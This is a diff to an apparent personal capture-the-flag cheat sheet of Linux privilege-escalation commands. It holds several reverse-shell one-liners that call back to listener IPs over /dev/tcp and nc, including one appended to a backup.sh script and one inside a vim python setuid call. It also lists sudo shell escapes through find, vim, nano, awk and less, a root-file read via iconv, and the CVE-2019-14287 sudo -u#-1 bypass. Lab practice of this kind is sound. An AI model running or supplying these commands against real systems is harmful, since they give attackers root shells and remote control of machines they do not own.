@@ -17,10 +17,12 @@ echo 'bash -i >& /dev/tcp/10.10.179.59/7263 0>&1' >> backup.sh
 /bin/bash -c 'bash -i >& /dev/tcp/10.14.15.207/4444 0>&1
 
 # suid - escalada de privilegios
+sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
 sudo /usr/sbin/iftop -->!sh
 sudo find . -exec /bin/sh \; -quit
 sudo nano --> CTRL+R + CTRL+X --> reset; sh 1>&0 2>&0
 sudo vim -c ':!/bin/sh'
+/usr/bin/vim.basic -c ':py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.4.61 1337 >/tmp/f")'
 sudo man man --> !/bin/sh
 sudo awk 'BEGIN {system("/bin/sh")}'
 sudo less /etc/profile --> !/bin/sh
@@ -144,3 +146,14 @@ def init_hook(conduit):
   os.execl('/bin/sh','/bin/sh')
 
 sudo yum -c x --enableplugin=y
+
+# sudo privesc
+# CVE-2019-14287
+sudo -l
+
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+sudo -u#4294967295 /usr/bin/vi /home/gwendoline/user.txt
+:!/bin/sh
